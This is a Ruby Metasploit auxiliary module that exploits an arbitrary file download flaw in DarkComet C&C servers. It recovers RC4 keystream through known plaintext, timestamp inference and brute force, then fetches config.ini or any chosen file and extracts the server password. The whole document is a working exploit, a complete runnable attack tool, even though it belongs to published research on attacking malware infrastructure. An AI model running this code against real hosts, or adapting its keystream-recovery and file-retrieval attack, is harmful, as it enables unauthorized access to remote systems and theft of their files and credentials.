##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DarkComet Server Remote File Download Exploit',
      'Description'    => %q{
        This module exploits an arbitrary file download vulnerability in the DarkComet C&C server versions 3.2 and up.
        The exploit does not need to know the password chosen for the bot/server communication.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Shawn Denbow & Jesse Hertz', # Vulnerability Discovery
          'Jos Wetzels' # Metasploit module, added support for versions < 5.1, removed need to know password via cryptographic attack
        ],
      'References'     =>
        [
          [ 'URL', 'https://www.nccgroup.trust/globalassets/our-research/us/whitepapers/PEST-CONTROL.pdf' ],
          [ 'URL', 'http://samvartaka.github.io/exploitation/2016/06/03/dead-rats-exploiting-malware' ]
        ],
      'DisclosureDate' => 'Oct 08 2012',
      'Platform'       => 'win'
    ))

    register_options(
      [
        Opt::RPORT(1604),
        Opt::RHOST('0.0.0.0'),

        OptAddressLocal.new('LHOST', [true, 'This is our IP (as it appears to the DarkComet C2 server)', '0.0.0.0']),
        OptString.new('KEY', [false, 'DarkComet RC4 key (include DC prefix with key eg. #KCMDDC51#-890password)', '']),
        OptBool.new('NEWVERSION', [false, 'Set to true if DarkComet version >= 5.1, set to false if version < 5.1', true]),
        OptString.new('TARGETFILE', [false, 'Target file to download (assumes password is set)', '']),
        OptBool.new('STORE_LOOT', [false, 'Store file in loot (will simply output file to console if set to false).', true]),
        OptInt.new('BRUTETIMEOUT', [false, 'Timeout (in seconds) for bruteforce attempts', 1])

      ])
  end

  # Functions for XORing two strings, deriving keystream using known plaintext and applying keystream to produce ciphertext
  def xor_strings(s1, s2)
    s1.unpack('C*').zip(s2.unpack('C*')).map { |a, b| a ^ b }.pack('C*')
  end

  def get_keystream(ciphertext, known_plaintext)
    c = [ciphertext].pack('H*')
    if known_plaintext.length > c.length
      return xor_strings(c, known_plaintext[0, c.length])
    elsif c.length > known_plaintext.length
      return xor_strings(c[0, known_plaintext.length], known_plaintext)
    else
      return xor_strings(c, known_plaintext)
    end
  end

  def use_keystream(plaintext, keystream)
    if keystream.length > plaintext.length
      return xor_strings(plaintext, keystream[0, plaintext.length]).unpack('H*')[0].upcase
    else
      return xor_strings(plaintext, keystream).unpack('H*')[0].upcase
    end
  end

  # Use RubyRC4 functionality (slightly modified from Max Prokopiev's implementation https://github.com/maxprokopiev/ruby-rc4/blob/master/lib/rc4.rb)
  # since OpenSSL requires at least 128-bit keys for RC4 while DarkComet supports any keylength
  def rc4_initialize(key)
    @q1 = 0
    @q2 = 0
    @key = []
    key.each_byte { |elem| @key << elem } while @key.size < 256
    @key.slice!(256..@key.size - 1) if @key.size >= 256
    @s = (0..255).to_a
    j = 0
    0.upto(255) do |i|
      j = (j + @s[i] + @key[i]) % 256
      @s[i], @s[j] = @s[j], @s[i]
    end
  end

  def rc4_keystream
    @q1 = (@q1 + 1) % 256
    @q2 = (@q2 + @s[@q1]) % 256
    @s[@q1], @s[@q2] = @s[@q2], @s[@q1]
    @s[(@s[@q1] + @s[@q2]) % 256]
  end

  def rc4_process(text)
    text.each_byte.map { |i| (i ^ rc4_keystream).chr }.join
  end

  def dc_encryptpacket(plaintext, key)
    rc4_initialize(key)
    rc4_process(plaintext).unpack('H*')[0].upcase
  end

  # Try to execute the exploit
  def try_exploit(exploit_string, keystream, bruting)
    connect
    idtype_msg = sock.get_once(12)

    if idtype_msg.length != 12
      disconnect
      return nil
    end

    if datastore['KEY'] != ''
      exploit_msg = dc_encryptpacket(exploit_string, datastore['KEY'])
    else
      # If we don't have a key we need enough keystream
      if keystream.nil?
        disconnect
        return nil
      end

      if keystream.length < exploit_string.length
        disconnect
        return nil
      end

      exploit_msg = use_keystream(exploit_string, keystream)
    end

    sock.put(exploit_msg)

    if bruting
      begin
        ack_msg = sock.timed_read(3, datastore['BRUTETIMEOUT'])
      rescue Timeout::Error
        disconnect
        return nil
      end
    else
      ack_msg = sock.get_once(3)
    end

    if ack_msg != "\x41\x00\x43"
      disconnect
      return nil
    # Different protocol structure for versions >= 5.1
    elsif datastore['NEWVERSION'] == true
      if bruting
        begin
          filelen = sock.timed_read(10, datastore['BRUTETIMEOUT']).to_i
        rescue Timeout::Error
          disconnect
          return nil
        end
      else
        filelen = sock.get_once(10).to_i
      end
      if filelen == 0
        disconnect
        return nil
      end

      if datastore['KEY'] != ''
        a_msg = dc_encryptpacket('A', datastore['KEY'])
      else
        a_msg = use_keystream('A', keystream)
      end

      sock.put(a_msg)

      if bruting
        begin
          filedata = sock.timed_read(filelen, datastore['BRUTETIMEOUT'])
        rescue Timeout::Error
          disconnect
          return nil
        end
      else
        filedata = sock.get_once(filelen)
      end

      if filedata.length != filelen
        disconnect
        return nil
      end

      sock.put(a_msg)
      disconnect
      return filedata
    else
      filedata = ''

      if bruting
        begin
          msg = sock.timed_read(1024, datastore['BRUTETIMEOUT'])
        rescue Timeout::Error
          disconnect
          return nil
        end
      else
        msg = sock.get_once(1024)
      end

      while (!msg.nil?) && (msg != '')
        filedata += msg
        if bruting
          begin
            msg = sock.timed_read(1024, datastore['BRUTETIMEOUT'])
          rescue Timeout::Error
            break
          end
        else
          msg = sock.get_once(1024)
        end
      end

      disconnect

      if filedata == ''
        return nil
      else
        return filedata
      end
    end
  end

  # Fetch a GetSIN response from C2 server
  def fetch_getsin
    connect
    idtype_msg = sock.get_once(12)

    if idtype_msg.length != 12
      disconnect
      return nil
    end

    keystream = get_keystream(idtype_msg, 'IDTYPE')
    server_msg = use_keystream('SERVER', keystream)
    sock.put(server_msg)

    getsin_msg = sock.get_once(1024)
    disconnect
    getsin_msg
  end

  # Carry out the crypto attack when we don't have a key
  def crypto_attack(exploit_string)
    getsin_msg = fetch_getsin
    if getsin_msg.nil?
      return nil
    end

    getsin_kp = 'GetSIN' + datastore['LHOST'] + '|'
    keystream = get_keystream(getsin_msg, getsin_kp)

    if keystream.length < exploit_string.length
      missing_bytecount = exploit_string.length - keystream.length

      print_status("Missing #{missing_bytecount} bytes of keystream ...")

      inferrence_segment = ''
      brute_max = 4

      if missing_bytecount > brute_max
        print_status("Using inferrence attack ...")

        # Offsets to monitor for changes
        target_offset_range = []
        for i in (keystream.length + brute_max)..(keystream.length + missing_bytecount - 1)
          target_offset_range << i
        end

        # Store inference results
        inference_results = {}

        # As long as we haven't fully recovered all offsets through inference
        # We keep our observation window in a circular buffer with 4 slots with the buffer running between [head, tail]
        getsin_observation = [''] * 4
        buffer_head = 0

        for i in 0..2
          getsin_observation[i] = [fetch_getsin].pack('H*')
          Rex.sleep(0.5)
        end

        buffer_tail = 3

        # Actual inference attack happens here
        while !target_offset_range.empty?
          getsin_observation[buffer_tail] = [fetch_getsin].pack('H*')
          Rex.sleep(0.5)

          # We check if we spot a change within a position between two consecutive items within our circular buffer
          # (assuming preceding entries are static in that position) we observed a 'carry', ie. our observed position went from 9 to 0
          target_offset_range.each do |x|
            index = buffer_head

            while index != buffer_tail do
              next_index = (index + 1) % 4

              # The condition we impose is that observed character x has to differ between two observations and the character left of it has to differ in those same
              # observations as well while being constant in at least one previous or subsequent observation
              if (getsin_observation[index][x] != getsin_observation[next_index][x]) && (getsin_observation[index][x - 1] != getsin_observation[next_index][x - 1]) && ((getsin_observation[(index - 1) % 4][x - 1] == getsin_observation[index][x - 1]) || (getsin_observation[next_index][x - 1] == getsin_observation[(next_index + 1) % 4][x - 1]))
                target_offset_range.delete(x)
                inference_results[x] = xor_strings(getsin_observation[index][x], '9')
                break
              end
              index = next_index
            end
          end

          # Update circular buffer head & tail
          buffer_tail = (buffer_tail + 1) % 4
          # Move head to right once tail wraps around, discarding oldest item in circular buffer
          if buffer_tail == buffer_head
            buffer_head = (buffer_head + 1) % 4
          end
        end

        # Inferrence attack done, reconstruct final keystream segment
        inf_seg = ["\x00"] * (keystream.length + missing_bytecount)
        inferrence_results.each do |x, val|
          inf_seg[x] = val
        end

        inferrence_segment = inf_seg.slice(keystream.length + brute_max, inf_seg.length).join
        missing_bytecount = brute_max
      end

      if missing_bytecount > brute_max
        print_status("Improper keystream recovery ...")
        return nil
      end

      print_status("Initiating brute force ...")

      # Bruteforce first missing_bytecount bytes of timestamp (maximum of brute_max)
      charset = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0']
      char_range = missing_bytecount.times.map { charset }
      char_range.first.product(*char_range[1..-1]) do |x|
        p = x.join
        candidate_plaintext = getsin_kp + p
        candidate_keystream = get_keystream(getsin_msg, candidate_plaintext) + inferrence_segment
        filedata = try_exploit(exploit_string, candidate_keystream, true)

        if !filedata.nil?
          return filedata
        end
      end
      return nil
    end

    try_exploit(exploit_string, keystream, false)
  end

  def parse_password(filedata)
    filedata.each_line { |line|
      elem = line.strip.split('=')
      if elem.length >= 1
        if elem[0] == 'PASSWD'
          if elem.length == 2
            return elem[1]
          else
            return ''
          end
        end
      end
    }
    return nil
  end

  def run
    # Determine exploit string
    if datastore['NEWVERSION'] == true
      if (datastore['TARGETFILE'] != '') && (datastore['KEY'] != '')
        exploit_string = 'QUICKUP1|' + datastore['TARGETFILE'] + '|'
      else
        exploit_string = 'QUICKUP1|config.ini|'
      end
    elsif (datastore['TARGETFILE'] != '') && (datastore['KEY'] != '')
      exploit_string = 'UPLOAD' + datastore['TARGETFILE'] + '|1|1|'
    else
      exploit_string = 'UPLOADconfig.ini|1|1|'
    end

    # Run exploit
    if datastore['KEY'] != ''
      filedata = try_exploit(exploit_string, nil, false)
    else
      filedata = crypto_attack(exploit_string)
    end

    # Harvest interesting credentials, store loot
    if !filedata.nil?
      # Automatically try to extract password from config.ini if we haven't set a key yet
      if datastore['KEY'] == ''
        password = parse_password(filedata)
        if password.nil?
          print_status("Could not find password in config.ini ...")
        elsif password == ''
          print_status("C2 server uses empty password!")
        else
          print_status("C2 server uses password [#{password}]")
        end
      end

      # Store to loot
      if datastore['STORE_LOOT'] == true
        print_status("Storing data to loot...")
        if (datastore['KEY'] == '') && (datastore['TARGETFILE'] != '')
          store_loot("darkcomet.file", "text/plain", datastore['RHOST'], filedata, 'config.ini', "DarkComet C2 server config file")
        else
          store_loot("darkcomet.file", "text/plain", datastore['RHOST'], filedata, datastore['TARGETFILE'], "File retrieved from DarkComet C2 server")
        end
      else
        print_status(filedata.to_s)
      end
    else
      print_error("Attack failed or empty config file encountered ...")
    end
  end
end
